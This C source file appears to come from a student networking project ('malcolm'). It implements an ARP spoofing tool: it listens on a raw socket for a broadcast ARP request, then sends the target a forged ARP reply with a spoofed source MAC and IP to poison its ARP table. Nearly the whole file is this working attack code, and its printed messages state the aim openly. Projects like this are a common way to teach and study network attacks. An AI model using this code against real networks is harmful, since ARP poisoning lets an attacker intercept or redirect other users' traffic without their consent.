#include "malcolm.h"

int	recv_arp(t_malcolm *mal)
{
	char		buf[BUFSIZE];
	ssize_t		ret;
	t_arp		*arp;
	char		*mac;
	char		*ip;

	ret = recvfrom(mal->sockfd, buf, BUFSIZE, 0, mal->d_addr, &mal->d_addrlen);
	arp = (t_arp *)(buf + 14);
	if (ret >= (ssize_t)(14 + sizeof(t_arp)) &&
		ntohs(arp->opcode) == 1)
	{
		mac = mac_strconv(arp->sender_mac);
		ip = ip_strconv(arp->sender_ip);
		printf("An ARP request has been broadcast.\n"
				"\tmac address of request : %s\n"
				"\tIP address of request : %s\n",
				mac , ip);
		ft_multifree(&mac, &ip, NULL);	
		return (1);
	}
	printf("%zu received\n", ret);
	return (0);
}

void	send_arp(t_malcolm *mal)
{
	ssize_t		ret;
	t_arp		*arp;
	char		buf[BUFSIZE];

	arp = (t_arp *)buf;
	//arp->etype = htons(ETH_P_RARP);
	arp->htype = htons(1);
	arp->ptype = htons(ETH_P_IP);
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);
	set_mac_addr(mal->s_maddr, arp->sender_mac, 6);
	set_ip_addr(mal->s_ip, arp->sender_ip, 4);
	set_mac_addr(mal->d_maddr, arp->target_mac, 6);
	set_ip_addr(mal->d_ip, arp->target_ip, 4);
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, mal->d_addr, mal->d_addrlen);
	printf("%zu sent\n", ret);
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
}

int	malcolm(t_malcolm *mal)
{
    struct ifaddrs	*ifap;
	int				ret;

	mal->info = get_addr_info(mal, mal->d_ip);
	if (!mal->info)
		return (2);
	ifap = get_interface(mal);
	if (!ifap)
		return (3);
	if (mal->ifa)
	{
		printf("Found available interface : %s\n", mal->ifa->ifa_name);
		mal->sockfd = set_socket(AF_PACKET, SOCK_RAW, ETH_P_ARP);
		if (mal->sockfd <= 0)
			return (4);
		ret = 0;
		while (!ret)
			ret = recv_arp(mal);
		close(mal->sockfd);
		mal->sockfd = set_socket(AF_INET, SOCK_PACKET, ETH_P_RARP);
		if (mal->sockfd <= 0)
			return (5);
		send_arp(mal);
		close(mal->sockfd);
	}
	freeifaddrs(ifap);
	freeaddrinfo(mal->info);
	return (0);
}
